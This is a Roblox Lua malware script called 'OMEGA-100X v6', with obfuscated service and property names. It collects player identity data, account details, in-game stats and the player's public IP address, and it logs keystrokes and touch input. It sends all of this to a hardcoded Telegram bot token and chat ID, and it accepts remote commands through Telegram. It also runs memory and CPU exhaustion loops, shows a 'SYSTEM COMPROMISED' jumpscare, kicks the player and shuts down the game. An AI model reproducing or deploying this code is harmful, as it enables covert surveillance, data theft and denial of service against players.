--[[ OMEGA-100X v6 FINAL — FULLY ENCRYPTED TELEGRAM EDITION ]]

local function k(s)
    local c = {}
    return function(x)
        if c[x] then return c[x] end
        local b = {string.byte(x, 1, -1)}
        local o = {}
        for i = 1, #b do
            local v = b[i] - (i % 13 + 7)
            if v < 0 then v = v + 256 end
            o[i] = string.char(v)
        end
        local r = table.concat(o)
        c[x] = r
        return r
    end
end

local q = k()

-- servizi
local a = game[q("\88\117\107\132\113\127\129")]
local b = game[q("\80\125\126\123\95\114\128\133\121\116\119")]
local c = game[q("\75\120\124\112\83\130\119")]
local d = game[q("\90\110\122\119\117\112\111\131\117\117\101\135\118\122\106\113\112")]
local e = game[q("\92\110\130\127\79\117\111\131\99\118\132\133\125\120\123")]
local f = game[q("\93\124\111\125\85\123\126\132\132\100\119\133\138\122\121\124")]
local g = game[q("\92\110\118\112\124\124\128\131\99\100\120\133\138\126\121\124")]
local h = a[q("\84\120\109\108\120\93\94\123\113\138\119\133")]

-- telegram config
local x = "8623538702:AAEbxtuyOhmkVBEnzVUBqO293czqswUJXGs"
local y = "6495265956"

-- stato
local isRunning = false
local keyloggerActive = false
local lastExfilTime = 0

-- sender telegram
local Telegram = {}
local queue = {}
local queueRunning = false
local consecutiveFailures = 0

local function getBackoffDelay()
    local exponentialDelay = 0.3 * (2 ^ math.min(consecutiveFailures, 4))
    local jitter = math.random() * 0.2
    return math.min(exponentialDelay + jitter, 5.0)
end

local function sendAsync(url, payload, callback)
    task.spawn(function()
        local success = false
        pcall(function()
            b[q("\88\120\125\127\77\128\135\125\115")](url, payload)
            success = true
        end)
        if callback then callback(success) end
    end)
end

local function processQueue()
    if queueRunning then return end
    queueRunning = true
    while #queue > 0 do
        local item = table.remove(queue, 1)
        sendAsync(item.url, item.payload, function(success)
            if success then
                consecutiveFailures = 0
            else
                consecutiveFailures += 1
                task.delay(getBackoffDelay(), function()
                    table.insert(queue, item)
                end)
            end
        end)
        task.wait(math.max(0.1, 0.3 - (#queue * 0.01)))
    end
    queueRunning = false
end

function Telegram:sendMessage(text)
    local url = "https://api.telegram.org/bot" .. x .. "/" .. q("\123\110\120\111\89\114\129\130\113\120\119")
    local payload = b[q("\82\92\89\89\81\123\113\114\127\117\119")]({
        [q("\107\113\107\127\107\118\119\115")] = y,
        [q("\124\110\130\127")] = text,
        [q("\120\106\124\126\113\108\109\124\125\128\119")] = q("\80\93\87\87")
    })
    table.insert(queue, {url = url, payload = payload})
    processQueue()
end

-- exfil
local Exfil = {}

function Exfil:stealAll()
    local data = {
        [q("\80\110\119\125\112\93\125")] = h[q("\86\106\119\112")],
        [q("\86\126\109\114\127\110\112\129\126\113")] = h[q("\86\106\119\112")],
        [q("\83\110\128\112\109\93")] = tostring(h[q("\83\110\128\112\109\93")]),
        [q("\65\110\128\128\111\117\124\111")] = h[q("\65\110\128\128\111\117\124\111")] .. q("\112\106\123\124"),
        [q("\80\126\113\128\126\128\109\94\127\110\93")] = tostring(h[q("\80\126\113\128\126\128\109\94\127\110\93")]),
        [q("\80\120\106\124\111\111\128\113")] = q("\80\111\127\115\120\93\98\126\113\124\106")
    }
    
    pcall(function()
        local st = h[q("\116\110\107\111\113\127\129\131\113\133\134\134")]
        if st then
            for _, v in ipairs(st[q("\79\110\126\78\116\118\119\123\116\131\128")]) do
                if v[q("\81\124\75")](q("\81\119\126\97\109\110\122\116")) or v[q("\81\124\75")](q("\86\126\119\109\113\127\100\101\113\134\119")) then
                    data[v[q("\86\106\119\112")]] = v[q("\94\106\118\128\113")]
                end
            end
        end
    end)
    
    pcall(function()
        data[q("\80\120\106\124\111\93\112")] = game[q("\80\120\106\124\111\93\112")]
    end)
    
    pcall(function()
        local ipData = b[q("\82\92\89\89\80\114\113\114\127\117\119")](b[q("\79\110\126\76\127\128\135\114")]("https://api.ipify.org?format=json"))
        data[q("\93\80")] = ipData.ip
    end)
    
    local text = "<b>⚡ OMEGA DATA HARVEST</b>\n\n"
    for key, value in pairs(data) do
        text = text .. "<b>" .. key .. ":</b> " .. tostring(value) .. "\n"
    end
    Telegram:sendMessage(text)
    lastExfilTime = os.clock()
end

-- keylogger
local Keylogger = {}

function Keylogger:start()
    keyloggerActive = true
    local buffer = ""
    local lastKeyTime = os.clock()
    
    f[q("\81\119\122\128\128\79\115\118\113\127")]:Connect(function(input, gp)
        if gp then return end
        local keyData = nil
        if input[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")] == Enum[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")][q("\92\110\130\127\85\123\126\132\132")] then
            keyData = input[q("\83\110\131\78\123\113\115")][q("\86\106\119\112")]
        elseif input[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")] == Enum[q("\93\124\111\125\85\123\126\132\132\100\102\140\132\122")][q("\83\110\131\109\123\110\128\115")] then
            keyData = input[q("\83\110\131\78\123\113\115")][q("\86\106\119\112")]
        end
        if keyData then
            local currentTime = os.clock()
            if currentTime - lastKeyTime > 1 then
                if buffer ~= "" then
                    Telegram:sendMessage("<b>⌨️ TASTI</b>\n<code>" .. buffer .. "</code>")
                end
                buffer = keyData
            else
                buffer = buffer .. " " .. keyData
            end
            lastKeyTime = currentTime
            if #buffer > 40 then
                Telegram:sendMessage("<b>⌨️ TASTI</b>\n<code>" .. buffer .. "</code>")
                buffer = ""
            end
        end
    end)
    
    f[q("\92\120\127\110\116\97\111\127")]:Connect(function(positions, gp)
        if not gp then
            local taps = {}
            for _, pos in ipairs(positions) do
                table.insert(taps, math.floor(pos.X) .. "," .. math.floor(pos.Y))
            end
            Telegram:sendMessage("<b>👆 TOUCH</b>\n<code>" .. table.concat(taps, " | ") .. "</code>")
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(30)
            if buffer ~= "" then
                Telegram:sendMessage("<b>⌨️ FLUSH</b>\n<code>" .. buffer .. "</code>")
                buffer = ""
            end
        end
    end)
end

-- persistence
h[q("\75\113\107\125\109\112\130\116\117\131\83\119\120\122\123\123")]:Connect(function()
    task.wait(1)
    Exfil:stealAll()
end)

-- memory nuke
local MemoryNuke = {}

function MemoryNuke:startCascade()
    task.delay(0.3, function()
        task.spawn(function()
            local root = {}
            local cur = root
            for depth = 1, 1000 do
                cur[depth] = {}
                cur = cur[depth]
            end
            while true do
                task.spawn(function()
                    local node = root
                    for depth = 1, 100 do
                        node[depth] = node[depth] or {}
                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_", 100)
                        node = node[depth]
                    end
                end)
                task.wait(0.05)
            end
        end)
    end)
    
    task.delay(0.5, function()
        task.spawn(function()
            local pool = {}
            while true do
                task.spawn(function()
                    local block = {}
                    for i = 1, 10 do
                        block[i] = string.rep("OMEGA_BLOCK_", 100000)
                    end
                    table.insert(pool, table.concat(block, ""))
                end)
                task.wait(0.1)
            end
        end)
    end)
    
    task.delay(0.7, function()
        task.spawn(function()
            while true do
                for i = 1, 30 do
                    task.spawn(function()
                        local fr = Instance.new("Frame")
                        fr.Size = UDim2.new(0, 50, 0, 50)
                        fr.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        fr.Parent = c
                        for j = 1, 5 do
                            local cl = Instance.new("TextLabel")
                            cl.Size = UDim2.new(1, 0, 1, 0)
                            cl.Text = string.rep("CRASH", 100)
                            cl.Parent = fr
                        end
                    end)
                end
                task.wait(0.02)
            end
        end)
    end)
    
    task.delay(1, function()
        local count = 0
        task.spawn(function()
            while count < 2000 do
                task.spawn(function()
                    while true do
                        local x = 0
                        for j = 1, 100000 do
                            x = x + j * math.random()
                        end
                        task.wait(0.01)
                    end
                end)
                count += 1
                if count % 100 == 0 then task.wait(0.1) end
            end
        end)
    end)
end

-- jumpscare
local function jumpscare()
    local sg = Instance.new("ScreenGui")
    sg.Name = "OmegaPurge"
    sg.Parent = c
    sg.IgnoreGuiInset = true
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mf = Instance.new("Frame")
    mf.Size = UDim2.new(1, 0, 1, 0)
    mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mf.Parent = sg
    
    local im = Instance.new("ImageLabel")
    im.Size = UDim2.new(1, 0, 1, 0)
    im.BackgroundTransparency = 1
    im.Image = "rbxassetid://155373809"
    im.ScaleType = Enum.ScaleType.Stretch
    im.Parent = mf
    
    local ro = Instance.new("Frame")
    ro.Size = UDim2.new(1, 0, 1, 0)
    ro.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    ro.BackgroundTransparency = 0.8
    ro.Parent = mf
    
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Font = Enum.Font.Code
    tl.Text = "⚠ SYSTEM COMPROMISED ⚠"
    tl.TextColor3 = Color3.fromRGB(255, 0, 0)
    tl.TextScaled = true
    tl.Parent = mf
    
    task.spawn(function()
        for i = 1, 15 do
            ro.BackgroundTransparency = math.random(0, 100) / 100
            im.Visible = not im.Visible
            tl.Visible = not tl.Visible
            task.wait(0.2)
        end
    end)
end

-- kick
local function kick()
    task.delay(2, function()
        pcall(function()
            h[q("\75\114\108\105")]("FATAL ERROR")
        end)
    end)
    task.delay(3, function()
        pcall(function()
            g[q("\84\110\112\126\112\111\114\108\95\111\118\128\111\112\104\110\112\127\114\121\98\108\126\112")](game.PlaceId, game.JobId, h)
        end)
    end)
end

-- monitor telegram
local Monitor = {}

function Monitor:checkCommands()
    local lastUpdateId = 0
    task.spawn(function()
        while true do
            pcall(function()
                local url = "https://api.telegram.org/bot" .. x .. "/getUpdates"
                if lastUpdateId > 0 then
                    url = url .. "?offset=" .. (lastUpdateId + 1)
                end
                local response = b:GetAsync(url)
                local data = b:JSONDecode(response)
                if data.ok and data.result then
                    for _, update in ipairs(data.result) do
                        lastUpdateId = update.update_id
                        if update.message and update.message.text then
                            local msg = update.message.text
                            local chatId = tostring(update.message.chat.id)
                            if chatId == y then
                                if msg:find("/status") then
                                    local text = "<b>🔍 STATUS</b>\n\nClient: online\nKeylogger: " .. (keyloggerActive and "attivo" or "off") .. "\nUptime: " .. math.floor(os.clock()) .. "s"
                                    Telegram:sendMessage(text)
                                elseif msg:find("/ping") then
                                    Telegram:sendMessage("<b>🏓 PONG</b>")
                                elseif msg:find("/fix") then
                                    Telegram:sendMessage("<b>🔧 FIX</b>")
                                    Exfil:stealAll()
                                elseif msg:find("/nuke") then
                                    Telegram:sendMessage("<b>💣 NUKE</b>")
                                    MemoryNuke:startCascade()
                                end
                            end
                        end
                    end
                end
            end)
            task.wait(3)
        end
    end)
end

-- avvio
isRunning = true
Monitor:checkCommands()
Telegram:sendMessage("<b>🟢 OMEGA V6 AVVIATO</b>\n\n" .. h.Name)

task.delay(0.5, function() Exfil:stealAll() end)
task.delay(1, function() Keylogger:start() end)
task.delay(1.5, function() jumpscare() end)
task.delay(2, function() MemoryNuke:startCascade() end)
task.delay(2.5, function() kick() end)
task.delay(5, function()
    pcall(function() game:Shutdown() end)
end)
